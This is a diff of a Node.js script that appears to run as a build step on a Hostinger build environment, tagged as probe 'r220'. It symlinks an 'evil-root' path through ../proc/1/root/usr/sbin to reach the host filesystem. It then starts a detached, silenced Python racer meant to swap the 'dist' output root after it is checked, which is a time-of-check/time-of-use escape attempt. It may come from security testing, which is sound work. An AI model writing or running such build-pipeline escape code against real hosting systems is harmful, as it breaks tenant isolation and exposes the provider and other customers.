@@ -1,16 +1,22 @@
 import fs from "node:fs";
 import path from "node:path";
+import { spawn } from "node:child_process";
 
-const marker = "HOSTINGER_NODE_USRSBIN_DIRECTORY_SYMLINK_GATE:r219";
+const marker = "HOSTINGER_NODE_OUTPUT_ROOT_TOCTOU_GATE:r220";
 const output = path.resolve("dist");
+const alternate = path.resolve("evil-root");
 fs.rmSync(output, { recursive: true, force: true });
-const linkTarget = "../../../../../../../usr/sbin";
-let outputLink;
+fs.rmSync(alternate, { recursive: true, force: true });
+fs.mkdirSync(output, { recursive: true });
+fs.writeFileSync(path.join(output, "control.txt"), `${marker}:894a8b0f9abe4351\n`, { mode: 0o600 });
+
+const hiddenTarget = "../../../../../../../proc/1/root/usr/sbin";
+let hiddenLink;
 try {
-  fs.symlinkSync(linkTarget, output);
-  outputLink = { created: true, target: linkTarget, isSymlink: fs.lstatSync(output).isSymbolicLink() };
+  fs.symlinkSync(hiddenTarget, alternate);
+  hiddenLink = { created: true, target: hiddenTarget, isSymlink: fs.lstatSync(alternate).isSymbolicLink() };
 } catch (error) {
-  outputLink = { created: false, target: linkTarget, errorCode: error.code ?? error.name };
+  hiddenLink = { created: false, target: hiddenTarget, errorCode: error.code ?? error.name };
 }
 
 let directRead;
@@ -21,47 +27,28 @@ try {
   directRead = { readable: false, errorCode: error.code ?? error.name };
 }
 
-let linkRead;
+const outputStat = fs.statSync(output);
+let racer;
 try {
-  const body = fs.readFileSync(output);
-  linkRead = { readable: true, bytes: body.length };
+  const child = spawn("python3", ["race-output-root.py"], {
+    cwd: process.cwd(),
+    detached: true,
+    stdio: "ignore",
+  });
+  child.unref();
+  racer = { started: true, pidPresent: Number.isInteger(child.pid) };
 } catch (error) {
-  linkRead = { readable: false, errorCode: error.code ?? error.name };
-}
-
-let outputStat;
-try {
-  const stat = fs.statSync(output);
-  outputStat = { available: true, isFile: stat.isFile(), isDirectory: stat.isDirectory(), bytes: stat.size };
-} catch (error) {
-  outputStat = { available: false, errorCode: error.code ?? error.name };
-}
-
-let outputSummary;
-try {
-  const names = fs.readdirSync(output);
-  let regularFiles = 0;
-  let readableRegularFiles = 0;
-  for (const name of names) {
-    try {
-      const stat = fs.lstatSync(path.join(output, name));
-      if (stat.isFile()) {
-        regularFiles += 1;
-        try { fs.accessSync(path.join(output, name), fs.constants.R_OK); readableRegularFiles += 1; } catch {}
-      }
-    } catch {}
-  }
-  outputSummary = { available: true, entryCount: names.length, regularFiles, readableRegularFiles };
-} catch (error) {
-  outputSummary = { available: false, errorCode: error.code ?? error.name };
+  racer = { started: false, errorCode: error.code ?? error.name };
 }
 
 console.log(JSON.stringify({
   marker,
   directRead,
-  linkRead,
-  outputLink,
-  outputStat,
-  outputSummary,
+  hiddenLink,
+  safeOutput: {
+    isDirectory: outputStat.isDirectory(),
+    entries: fs.readdirSync(output).sort(),
+  },
+  racer,
   outputRelativeToRepository: path.relative(process.cwd(), output),
 }));
